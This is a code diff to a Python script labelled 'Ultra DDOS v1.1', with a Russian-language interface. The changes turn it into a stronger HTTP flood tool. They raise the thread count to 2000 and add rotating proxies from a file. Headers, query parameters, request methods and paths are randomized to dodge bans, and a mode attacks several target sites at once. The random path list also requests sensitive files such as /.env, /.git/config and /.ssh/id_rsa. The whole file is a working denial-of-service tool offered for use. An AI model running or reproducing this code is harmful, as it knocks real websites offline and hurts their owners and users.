@@ -5,6 +5,8 @@ import random
 import json
 import threading
 import requests
+from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urlparse, urljoin
 
 # ================= ВКЛЮЧАЕМ ANSI ДЛЯ WINDOWS =================
 if os.name == 'nt':
@@ -16,8 +18,9 @@ if os.name == 'nt':
         pass
 
 # ================= НАСТРОЙКИ =================
-MAX_THREADS = 30
-TIMEOUT = 5
+MAX_THREADS = 2000
+TIMEOUT = 3
+MAX_RETRIES = 3
 
 # ================= ЗЕЛЁНЫЙ ГРАДИЕНТ =================
 G1 = "\033[38;2;0;60;0m"
@@ -27,7 +30,6 @@ G4 = "\033[38;2;0;160;0m"
 G5 = "\033[38;2;0;200;0m"
 G6 = "\033[38;2;0;230;0m"
 G7 = "\033[38;2;50;255;50m"
-GW = "\033[38;2;200;255;200m"
 
 R = "\033[91m"
 G = "\033[92m"
@@ -36,15 +38,112 @@ C = "\033[96m"
 W = "\033[97m"
 E = "\033[0m"
 
-# ================= USER-AGENTS =================
+# ================= РАСШИРЕННЫЙ СПИСОК USER-AGENTS =================
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
     'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
     'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
 ]
+
+# ================= СЛУЧАЙНЫЕ ЗАГОЛОВКИ =================
+def random_headers():
+    return {
+        'User-Agent': random.choice(USER_AGENTS),
+        'Accept': random.choice(['*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json', 'text/plain']),
+        'Accept-Language': random.choice(['ru-RU,ru;q=0.9,en;q=0.8', 'en-US,en;q=0.9', 'de-DE,de;q=0.8,en;q=0.7', 'fr-FR,fr;q=0.9,en;q=0.8']),
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
+        'Connection': random.choice(['keep-alive', 'close']),
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script', 'style', 'image']),
+        'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
+        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
+        'Pragma': random.choice(['no-cache', '']),
+        'DNT': '1',
+    }
+
+# ================= СЛУЧАЙНЫЕ ПАРАМЕТРЫ =================
+def random_params():
+    params = {
+        't': random.randint(1000, 99999),
+        'r': random.random(),
+        'sid': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz123456789', k=random.randint(6, 12))),
+        'v': random.randint(1, 10),
+        'cb': str(random.randint(100000, 999999)),
+        'rand': random.randint(10000, 99999),
+        'timestamp': str(int(time.time() * 1000) + random.randint(-10000, 10000)),
+    }
+    # Добавляем случайные параметры
+    for _ in range(random.randint(1, 5)):
+        key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
+        value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz123456789', k=random.randint(5, 15)))
+        params[key] = value
+    return params
+
+# ================= СЛУЧАЙНЫЙ ПУТЬ =================
+def random_path(base_url):
+    paths = [
+        '/', '/index.html', '/index.php', '/index.asp', '/index.aspx',
+        '/api/v1/test', '/api/v2/data', '/api/v3/status', '/api/v4/info',
+        '/images/logo.png', '/images/banner.jpg', '/images/favicon.ico',
+        '/css/style.css', '/css/main.css', '/css/bootstrap.css',
+        '/js/script.js', '/js/main.js', '/js/jquery.js', '/js/app.js',
+        '/wp-content/themes/twentythree/style.css', '/wp-content/plugins/plugin.js',
+        '/static/css/main.css', '/static/js/main.js', '/static/img/logo.png',
+        '/assets/css/style.css', '/assets/js/script.js', '/assets/img/bg.jpg',
+        '/media/js/main.js', '/media/css/style.css',
+        '/robots.txt', '/sitemap.xml', '/ads.txt', '/humans.txt',
+        '/.env', '/.git/config', '/.htaccess', '/.ssh/id_rsa',
+        '/backup.sql', '/dump.sql', '/database.sql',
+        '/config.php', '/settings.ini', '/config.json',
+        '/vendor/autoload.php', '/vendor/composer/installed.json',
+        '/node_modules/package.json', '/package.json', '/composer.json',
+        '/about', '/contact', '/products', '/services', '/blog',
+        '/category', '/tag', '/author', '/search',
+        '/login', '/register', '/forgot-password', '/profile',
+    ]
+    parsed = urlparse(base_url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    return base + random.choice(paths)
+
+# ================= ЗАГРУЗКА ПРОКСИ =================
+def load_proxies():
+    proxies = []
+    try:
+        with open('proxies.txt', 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    if '@' in line:
+                        auth, addr = line.split('@')
+                        user, passwd = auth.split(':')
+                        proxies.append({
+                            'http': f'http://{user}:{passwd}@{addr}',
+                            'https': f'http://{user}:{passwd}@{addr}'
+                        })
+                    else:
+                        proxies.append({
+                            'http': f'http://{line}',
+                            'https': f'http://{line}'
+                        })
+        return proxies
+    except:
+        return []
 
 # ================= СТАТИСТИКА =================
 def load_stats():
@@ -59,7 +158,6 @@ def save_stats(s):
         json.dump(s, f, indent=4)
 
 def update_stats(a):
-    """Обновляет глобальную статистику после атаки"""
     s = load_stats()
     s["attacks"] += 1
     s["requests"] += a.req
@@ -70,6 +168,20 @@ def update_stats(a):
 # ================= ВСПОМОГАТЕЛЬНЫЕ =================
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
+
+def safe_int(prompt, default=100, min_val=1, max_val=2000):
+    while True:
+        u = input(prompt)
+        if u == "":
+            return default
+        try:
+            v = int(u)
+            if min_val <= v <= max_val:
+                return v
+            else:
+                print(f"{R}Введите число от {min_val} до {max_val}{E}")
+        except:
+            print(f"{R}Введите число!{E}")
 
 def bar(p, w=20):
     p = max(0, min(100, p))
@@ -90,13 +202,21 @@ def banner():
 {G3}   ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  {E}
 {G2}     ░         ░  ░          ░           ░  ░      ░       ░        ░ ░        ░  {E}
 {G1}                                               ░       ░                           {E}
+{G7}████████  █████  ██████  ██ ███████ ████████ ███████{E}
+{G7}   ██    ██   ██ ██   ██ ██ ██         ██    ██{E}
+{G7}   ██    ███████ ██████  ██ ███████    ██    █████{E}
+{G7}   ██    ██   ██ ██   ██ ██      ██    ██    ██{E}
+{G7}   ██    ██   ██ ██   ██ ██ ███████    ██    ███████{E}
+{G5}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {G7}Ultra DDOS v1.1 | Developer: verifactor @newince
+{G5}Максимум потоков: {W}{MAX_THREADS}
+{G5}Загружено прокси: {W}{len(load_proxies())}
 {E}
 """)
 
-# ================= HTTP АТАКА =================
+# ================= МОЩНАЯ АТАКА =================
 class Attack:
-    def __init__(self, name=""):
+    def __init__(self, name="", proxies=None):
         self.name = name
         self.running = False
         self.req = 0
@@ -106,25 +226,103 @@ class Attack:
         self.bytes = 0
         self.start = 0
         self.lock = threading.Lock()
+        self.proxies = proxies or []
+        self.proxy_index = 0
+        self.proxy_lock = threading.Lock()
+        
+        # Создаём пул сессий
         self.session = requests.Session()
-    
-    def http_worker(self, url):
+        adapter = requests.adapters.HTTPAdapter(
+            pool_connections=200,
+            pool_maxsize=200,
+            max_retries=3
+        )
+        self.session.mount('http://', adapter)
+        self.session.mount('https://', adapter)
+        
+        # Для многопоточности
+        self.executor = ThreadPoolExecutor(max_workers=MAX_THREADS)
+        self.futures = []
+
+    def get_proxy(self):
+        if not self.proxies:
+            return None
+        with self.proxy_lock:
+            proxy = self.proxies[self.proxy_index]
+            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
+            return proxy
+
+    def make_request(self, url):
         try:
-            time.sleep(random.uniform(0.05, 0.2))
-            headers = {'User-Agent': random.choice(USER_AGENTS)}
-            r = self.session.get(url, headers=headers, timeout=TIMEOUT)
+            proxy = self.get_proxy()
+            headers = random_headers()
+            params = random_params()
+            path_url = random_path(url)
+            
+            # Добавляем случайный фрагмент
+            if random.random() > 0.5:
+                path_url += f'#{random.randint(1000, 9999)}'
+            
+            start_time = time.time()
+            
+            # Используем разные методы
+            method = random.choice(['GET', 'POST', 'HEAD'])
+            
+            if method == 'GET':
+                response = self.session.get(
+                    path_url,
+                    params=params,
+                    headers=headers,
+                    proxies=proxy,
+                    timeout=TIMEOUT,
+                    allow_redirects=True
+                )
+            elif method == 'POST':
+                data = {'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 100)))}
+                response = self.session.post(
+                    path_url,
+                    params=params,
+                    data=data,
+                    headers=headers,
+                    proxies=proxy,
+                    timeout=TIMEOUT
+                )
+            else:  # HEAD
+                response = self.session.head(
+                    path_url,
+                    params=params,
+                    headers=headers,
+                    proxies=proxy,
+                    timeout=TIMEOUT
+                )
+            
+            elapsed = time.time() - start_time
             
             with self.lock:
                 self.req += 1
-                self.bytes += len(r.content)
-                if r.status_code in [200, 301, 302, 304, 404]:
+                self.bytes += len(response.content)
+                
+                if response.status_code in [200, 201, 202, 204, 301, 302, 303, 304, 307, 308, 404]:
                     self.ok += 1
-                elif r.status_code in [403, 429, 503, 401]:
+                    # Небольшая задержка для успешных запросов
+                    time.sleep(random.uniform(0.001, 0.005))
+                elif response.status_code in [403, 429, 503, 401, 402, 405, 406, 407, 408, 410, 413, 414, 415, 416, 417]:
                     self.ban += 1
                     self.err += 1
+                    # Большая задержка при бане
+                    time.sleep(random.uniform(0.05, 0.1))
                 else:
                     self.err += 1
-        except:
+                    
+        except requests.exceptions.Timeout:
+            with self.lock:
+                self.req += 1
+                self.err += 1
+        except requests.exceptions.ConnectionError:
+            with self.lock:
+                self.req += 1
+                self.err += 1
+        except Exception:
             with self.lock:
                 self.req += 1
                 self.err += 1
@@ -136,29 +334,34 @@ class Attack:
         
         def worker():
             while self.running:
-                self.http_worker(url)
+                try:
+                    self.make_request(url)
+                except:
+                    pass
         
-        threads_list = []
+        # Создаём потоки
         for _ in range(threads):
             t = threading.Thread(target=worker, daemon=True)
             t.start()
-            threads_list.append(t)
         
         while self.running:
-            time.sleep(0.1)
+            time.sleep(0.05)
         
-        for t in threads_list:
-            t.join(timeout=0.1)
+        # Очистка
+        for t in threading.enumerate():
+            if t != threading.current_thread() and t.is_alive():
+                try:
+                    t.join(timeout=0.1)
+                except:
+                    pass
 
     def stop(self):
         self.running = False
 
 # ================= ВЫВОД СТАТУСА =================
 def show_attack_status(attacks):
-    sys.stdout.write('\033[H\033[J')
+    sys.stdout.write('\033[H')
     sys.stdout.flush()
-    
-    banner()
     
     if not attacks:
         return
@@ -166,40 +369,47 @@ def show_attack_status(attacks):
     total_req = sum(a.req for a in attacks)
     total_ok = sum(a.ok for a in attacks)
     total_err = sum(a.err for a in attacks)
+    total_ban = sum(a.ban for a in attacks)
     total_bytes = sum(a.bytes for a in attacks)
     total_elapsed = int(time.time() - attacks[0].start) if attacks and attacks[0].start else 0
     
+    rate = int(total_req / total_elapsed) if total_elapsed > 0 else 0
+    load = min(100, int((rate / 100) * 100)) if rate > 0 else 0
+    
     output = f"""
-{G7}⚡ {'КОМБО-АТАКА' if len(attacks) > 1 else 'АТАКА'} В ПРОЦЕССЕ ⚡
-{G4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{G7}💀 {'КОМБО-АТАКА' if len(attacks) > 1 else 'АТАКА'} В ПРОЦЕССЕ 💀
+{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 {G6}Активных атак: {W}{len(attacks)}
-{G6}Всего запросов: {W}{total_req:,}
-{G6}Успешно: {G}{total_ok:,}{E}
-{G6}Ошибки: {R}{total_err:,}{E}
-{G6}Данные: {W}{total_bytes/1024/1024:.1f} MB
-{G6}Время: {W}{total_elapsed//3600:02d}:{total_elapsed%3600//60:02d}:{total_elapsed%60:02d}
+{R}Всего запросов: {W}{total_req:,}
+{G}Успешно: {W}{total_ok:,}
+{R}Ошибки: {W}{total_err:,}
+{Y}Бан: {W}{total_ban}
+{C}Данные: {W}{total_bytes/1024/1024:.1f} MB
+{C}Скорость: {W}{rate:,} r/s
+{C}Нагрузка: {W}{bar(load)}
+{C}Время: {W}{total_elapsed//3600:02d}:{total_elapsed%3600//60:02d}:{total_elapsed%60:02d}
 
-{G4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
     
     for i, a in enumerate(attacks, 1):
         elapsed = int(time.time() - a.start) if a.start else 0
-        rate = int(a.req / elapsed) if elapsed > 0 else 0
-        load = min(100, int((rate / 10) * 100)) if rate > 0 else 0
+        rate_a = int(a.req / elapsed) if elapsed > 0 else 0
+        load_a = min(100, int((rate_a / 50) * 100)) if rate_a > 0 else 0
         
         output += f"""
 {G5}[{i}] {a.name}
-{G6}  Запросы: {W}{a.req:,}  {G}✓{a.ok}  {R}✗{a.err}{E}  {G7}{bar(load)}{E}
-{G6}  Скорость: {W}{rate} r/s  {G6}Время: {elapsed}с
+{G6}  Запросы: {W}{a.req:,}  {G}✓{a.ok}  {R}✗{a.err}{E}  {Y}🚫{a.ban}{E}  {G7}{bar(load_a)}{E}
+{G6}  Скорость: {W}{rate_a} r/s  {G6}Время: {elapsed}с
 """
     
     output += f"""
-{G4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{G7}[Press ENTER to stop all]
+{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{G7}[Press ENTER to stop all] | [Ctrl+C] - экстренная остановка
 {E}
 """
-    sys.stdout.write(output)
+    sys.stdout.write('\033[J' + output)
     sys.stdout.flush()
 
 # ================= ОДИНОЧНАЯ АТАКА =================
@@ -207,7 +417,7 @@ def single_attack():
     clear()
     banner()
     
-    print(f"{G7}ВЫБОР ЦЕЛИ{E}")
+    print(f"{G7}💀 МОЩНАЯ АТАКА 💀{E}")
     url = input(f"{G6}URL: {W}")
     if not url:
         print(f"{R}Ошибка! URL не может быть пустым{E}")
@@ -217,10 +427,18 @@ def single_attack():
     if not url.startswith('http'):
         url = 'http://' + url
     
-    threads = 20
-    print(f"{G6}Потоки: {W}{threads} (оптимально){E}")
+    threads = safe_int(f"{G6}Потоки (1-{MAX_THREADS}): {W}", 100, 1, MAX_THREADS)
     
-    a = Attack(name="HTTP Flood")
+    # Загружаем прокси
+    proxies = load_proxies()
+    if not proxies:
+        print(f"{Y}⚠ Прокси не найдены! Работа без прокси — ваш IP будет забанен{E}")
+        time.sleep(1)
+    
+    print(f"{G6}Запуск с {threads} потоками...{E}")
+    time.sleep(0.5)
+    
+    a = Attack(name=f"💀 Target ({threads} потоков)", proxies=proxies)
     
     t = threading.Thread(target=a.start_http, args=(url, threads), daemon=True)
     t.start()
@@ -235,25 +453,27 @@ def single_attack():
     try:
         while a.running and not stop[0]:
             show_attack_status([a])
-            time.sleep(0.3)
+            time.sleep(0.1)
     except KeyboardInterrupt:
         a.stop()
     
     a.stop()
     t.join(timeout=0.5)
     
-    # Сохраняем статистику
     update_stats(a)
     
     clear()
     banner()
     print(f"""
-{G7}АТАКА ЗАВЕРШЕНА
+{G7}💀 АТАКА ЗАВЕРШЕНА 💀
 
-{G6}Запросы: {W}{a.req:,}
-{G6}Успешно: {G}{a.ok:,}{E}
-{G6}Ошибки: {R}{a.err:,}{E}
-{G6}Время: {W}{int(time.time() - a.start)} сек
+{R}Запросы: {W}{a.req:,}
+{G}Успешно: {W}{a.ok:,}
+{R}Ошибки: {W}{a.err:,}
+{Y}Бан: {W}{a.ban}
+{C}Потоки: {W}{threads}
+{C}Время: {W}{int(time.time() - a.start)} сек
+{C}Скорость: {W}{int(a.req / (time.time() - a.start)) if (time.time() - a.start) > 0 else 0} r/s
 {E}
 """)
     input(f"{G7}Нажми ENTER для возврата...{E}")
@@ -263,7 +483,7 @@ def combo_attack():
     clear()
     banner()
     
-    print(f"{G7}КОМБО-АТАКА (несколько целей сразу){E}")
+    print(f"{G7}💀 КОМБО-АТАКА (несколько целей сразу) 💀{E}")
     print(f"{G6}Введи цели через запятую (например: site1.com, site2.com, site3.com){E}")
     targets = input(f"{W}Цели: {E}")
     
@@ -275,14 +495,20 @@ def combo_attack():
     
     urls = [u if u.startswith('http') else 'http://' + u for u in urls]
     
-    threads_per_target = 15
+    threads_per_target = safe_int(f"{G6}Потоков на цель (1-{MAX_THREADS}): {W}", 50, 1, MAX_THREADS)
+    
+    # Загружаем прокси
+    proxies = load_proxies()
+    if not proxies:
+        print(f"{Y}⚠ Прокси не найдены! Работа без прокси — ваш IP будет забанен{E}")
+        time.sleep(1)
     
     print(f"\n{G6}Запускаю {len(urls)} атак по {threads_per_target} потоков...{E}")
     time.sleep(0.5)
     
     attacks = []
     for i, url in enumerate(urls, 1):
-        a = Attack(name=f"Target {i}: {url[:20]}...")
+        a = Attack(name=f"💀 Target {i}: {url[:20]}... ({threads_per_target} потоков)", proxies=proxies)
         t = threading.Thread(target=a.start_http, args=(url, threads_per_target), daemon=True)
         t.start()
         attacks.append(a)
@@ -299,7 +525,7 @@ def combo_attack():
     try:
         while any(a.running for a in attacks) and not stop[0]:
             show_attack_status(attacks)
-            time.sleep(0.3)
+            time.sleep(0.1)
     except KeyboardInterrupt:
         for a in attacks:
             a.stop()
@@ -308,7 +534,6 @@ def combo_attack():
         a.stop()
         time.sleep(0.1)
     
-    # Сохраняем статистику для каждой атаки
     for a in attacks:
         update_stats(a)
     
@@ -318,22 +543,24 @@ def combo_attack():
     total_req = sum(a.req for a in attacks)
     total_ok = sum(a.ok for a in attacks)
     total_err = sum(a.err for a in attacks)
+    total_ban = sum(a.ban for a in attacks)
     
     print(f"""
-{G7}КОМБО-АТАКА ЗАВЕРШЕНА
+{G7}💀 КОМБО-АТАКА ЗАВЕРШЕНА 💀
 
-{G6}Всего атак: {W}{len(attacks)}
-{G6}Всего запросов: {W}{total_req:,}
-{G6}Успешно: {G}{total_ok:,}{E}
-{G6}Ошибки: {R}{total_err:,}{E}
-{G6}Время: {W}{int(time.time() - attacks[0].start)} сек
+{R}Всего атак: {W}{len(attacks)}
+{R}Всего запросов: {W}{total_req:,}
+{G}Успешно: {W}{total_ok:,}
+{R}Ошибки: {W}{total_err:,}
+{Y}Бан: {W}{total_ban}
+{C}Время: {W}{int(time.time() - attacks[0].start)} сек
 
-{G4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {G5}Детали по целям:{E}
 """)
     
     for i, a in enumerate(attacks, 1):
-        print(f"{G5}[{i}] {a.name} — {G}✓{a.ok} {R}✗{a.err}{E}")
+        print(f"{G5}[{i}] {a.name} — {G}✓{a.ok} {R}✗{a.err} {Y}🚫{a.ban}{E}")
     
     print(f"\n{G7}Нажми ENTER для возврата...{E}")
     input()
@@ -345,8 +572,8 @@ def menu():
     print(f"""
 {G7}ГЛАВНОЕ МЕНЮ
 
-{G6}1.{W} Одиночная атака
-{G6}2.{W} КОМБО-АТАКА (несколько целей сразу)
+{R}1.{W} 💀 Одиночная атака (мощная)
+{R}2.{W} 💀 КОМБО-АТАКА (несколько целей)
 {G5}99.{W} Exit
 {E}
 """)
